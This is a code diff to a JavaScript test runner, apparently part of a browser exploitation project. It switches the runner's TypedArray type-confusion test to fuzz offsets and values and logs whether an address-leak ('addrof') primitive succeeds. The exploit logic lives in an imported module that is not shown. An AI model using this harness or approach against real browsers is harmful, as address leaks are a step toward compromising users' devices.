@@ -2,76 +2,57 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 import { 
-    executeTypedArrayVictimAddrofTest_GetterOnReturnedMarker,   // NOME DA FUNÇÃO ATUALIZADO
-    FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL    // NOME DO MÓDULO ATUALIZADO
+    executeTypedArrayVictimAddrofTest_OffsetValueFuzz,   // NOME DA FUNÇÃO ATUALIZADO
+    FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF    // NOME DO MÓDULO ATUALIZADO
 } from './testArrayBufferVictimCrash.mjs';
 
 async function runHeisenbugReproStrategy_TypedArrayVictim() {
-    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_GetterOnReturnedMarker";
-    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (GetterOnReturnedMarker) ====`, 'test', FNAME_RUNNER);
+    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_OffsetValueFuzz";
+    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (OffsetValueFuzzing) ====`, 'test', FNAME_RUNNER);
 
-    const result = await executeTypedArrayVictimAddrofTest_GetterOnReturnedMarker(); 
+    const result = await executeTypedArrayVictimAddrofTest_OffsetValueFuzz(); 
 
-    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
-    
-    if (result.errorOccurred) {
-        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
-        document.title = `Heisenbug (TypedArray-v20R) ERR: ${result.errorOccurred.name}`;
-    } else {
-        logS3(`   RESULTADO: Completou. Detalhes da última sonda relevante (M2 confuso): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "good", FNAME_RUNNER);
-        logS3(`   Stringify Output (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
-        
-        let heisenbugOnReturnedMarker = false;
-        if (result.toJSON_details && 
-            result.toJSON_details.this_is_prev_marker &&
-            result.toJSON_details.this_type === "[object Object]") {
-            heisenbugOnReturnedMarker = true;
-        }
+    if (result.errorOccurred) { // Erro principal no teste, fora do loop de iteração
+        logS3(`   RESULTADO: ERRO JS PRINCIPAL CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "critical", FNAME_RUNNER);
+        document.title = `Heisenbug (TypedArray-OVF) MAIN ERR!`; 
+    } else if (result.overall_results && result.overall_results.length > 0) {
+        logS3(`   RESULTADO: Teste de Fuzzing de Offset/Valor Concluído. Verificando resultados...`, "good", FNAME_RUNNER);
+        let anyIterationSuccess = false;
+        let firstSuccessfulParams = null;
 
-        let anyAddrofSuccess = false;
-        const addrofChecks = [
-            {name: "StringifyOutGetter", res: result.addrof_StringifyOutput_Getter},
-            {name: "StringifyOutDirect", res: result.addrof_StringifyOutput_Direct}
-        ];
-
-        addrofChecks.forEach(item => {
-            if (item.res && item.res.success) {
-                 logS3(`     ADDROF ${item.name} SUCESSO! ${item.res.msg}`, "vuln", FNAME_RUNNER); anyAddrofSuccess = true;
-            } else if (item.res) {
-                 logS3(`     ADDROF ${item.name} FALHOU: ${item.res.msg}`, "warn", FNAME_RUNNER);
+        result.overall_results.forEach(iter_res => {
+            logS3(`--- Iteration Offset: ${iter_res.offset}, Value: ${iter_res.value} ---`, 'info', FNAME_RUNNER);
+            logS3(`    Stringify Output (Parseado): ${iter_res.stringify_output ? JSON.stringify(iter_res.stringify_output) : 'N/A'}`, 'info', FNAME_RUNNER);
+            logS3(`    Detalhes da última sonda: ${iter_res.probe_details ? JSON.stringify(iter_res.probe_details) : 'N/A'}`, 'info', FNAME_RUNNER);
+            logS3(`    Addrof na Vítima (A): ${iter_res.addrof_victim_A.msg}`, 'info', FNAME_RUNNER);
+            logS3(`    Addrof no Output (LeakyA): Success=${iter_res.addrof_output_leaky_A.success}, Msg='${iter_res.addrof_output_leaky_A.msg}'`, iter_res.addrof_output_leaky_A.success ? "vuln" : "warn", FNAME_RUNNER);
+            if (iter_res.error) {
+                 logS3(`    ERRO nesta iteração: ${iter_res.error}`, "error", FNAME_RUNNER);
+            }
+            if (iter_res.addrof_output_leaky_A.success) {
+                anyIterationSuccess = true;
+                if (!firstSuccessfulParams) firstSuccessfulParams = `Off:${iter_res.offset},Val:${iter_res.value}`;
             }
         });
 
-        if (result.toJSON_details && result.toJSON_details.error_in_probe) {
-            logS3(`     ERRO INTERNO NA SONDA: ${result.toJSON_details.error_in_probe}`, "warn", FNAME_RUNNER);
-            document.title = `Heisenbug (TypedArray-v20R) toJSON_ERR`;
-        } else if (heisenbugOnReturnedMarker) {
-            logS3(`     !!!! TYPE CONFUSION NO OBJETO MARCADOR (M2) OBSERVADA !!!! (Chamada #${result.toJSON_details.call_number})`, "critical", FNAME_RUNNER);
-            if (result.toJSON_details.getter_defined) { 
-                logS3(`       Getter definido no marcador confuso.`, "info");
-            }
-            if (result.toJSON_details.direct_prop_set) { 
-                 logS3(`       Propriedade direta definida no marcador confuso.`, "info");
-            }
-            if (!anyAddrofSuccess) {
-                 document.title = `Heisenbug (TypedArray-v20R) MarkerTC OK, Addr Fail`;
-            } else { 
-                 document.title = `Heisenbug (TypedArray-v20R) AddrInMarker SUCCESS!`;
-            }
-        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL) || document.title.includes("Probing")) {
-            if (!anyAddrofSuccess) {
-                 document.title = `Heisenbug (TypedArray-v20R) Test OK/No MarkerTC`;
-            }
+        if (anyIterationSuccess) {
+            document.title = `Heisenbug (TypedArray-OVF) Addr SUCCESS @ ${firstSuccessfulParams}!`;
+        } else {
+            document.title = `Heisenbug (TypedArray-OVF) Fuzzing Done, No Addr`;
         }
+    } else {
+        logS3(`   RESULTADO: Nenhuma iteração de resultado encontrada.`, "warn", FNAME_RUNNER);
+        document.title = `Heisenbug (TypedArray-OVF) No Results`;
     }
+
     logS3(`   Título da página: ${document.title}`, "info");
     await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    logS3(`==== Estratégia de Reprodução do Heisenbug (GetterOnReturnedMarker) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
+    logS3(`==== Estratégia de Reprodução do Heisenbug (OffsetValueFuzzing) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
 }
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL}_MainOrchestrator`; 
+    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF}_MainOrchestrator`; 
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
@@ -79,18 +60,18 @@ export async function runAllAdvancedTestsS3() {
     if (outputDiv) outputDiv.innerHTML = '';
 
     logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
-    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (GetterOnReturnedMarker) ====`, 'test', FNAME_ORCHESTRATOR);
+    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (OffsetValueFuzzing) ====`, 'test', FNAME_ORCHESTRATOR);
 
     await runHeisenbugReproStrategy_TypedArrayVictim();
 
     logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
     if (runBtn) runBtn.disabled = false;
 
-    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL)) {
+    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF)) {
         if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
-            !document.title.includes("SUCESSO") && !document.title.includes("Addr Fail") && 
-            !document.title.includes("ERR") && !document.title.includes("MarkerTC OK")) { 
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V20_REVIVAL} Concluído`;
+            !document.title.includes("SUCCESS") && !document.title.includes("No Addr") && 
+            !document.title.includes("ERR")) { 
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_OVF} Concluído`;
         }
     }
 }
